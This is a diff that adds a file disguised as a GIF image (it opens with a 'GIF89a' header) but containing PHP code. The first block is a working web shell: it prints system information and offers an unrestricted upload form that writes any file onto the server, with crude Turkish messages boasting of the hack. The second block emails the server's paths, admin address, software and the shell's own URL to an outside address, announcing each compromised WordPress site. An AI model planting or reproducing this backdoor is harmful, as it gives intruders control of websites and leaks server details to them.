@@ -1,0 +1,19 @@
+GIF89a;
+<?php
+echo '<b><br><br>'.php_uname().'<br></b>';
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>usta upload basarili koy amina sitenin!!</b><br><br>'; }
+	else { echo '<b>usta upload basarili olmadi.Baska siteye dal!!</b><br><br>'; }
+}
+?>
+<?php //  
+$kime="cethardy@hotmail.com";
+$baslik="WordPresS Tema Sw Avcisi V3.0";
+$katre="Dosya Yolu : ".$_SERVER['DOCUMENT_ROOT']."rn";
+$katre.="Server Admin : ".$_SERVER['SERVER_ADMIN']."rn";
+$katre.="Server isletim sistemi : ".$_SERVER['SERVER_SOFTWARE']."rn";
+$katre.="Shell Link : http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."rn";
+$katre.="Avlanan Site : " .$_SERVER['HTTP_HOST']."rn";
+mail($kime, $baslik, $katre);?>
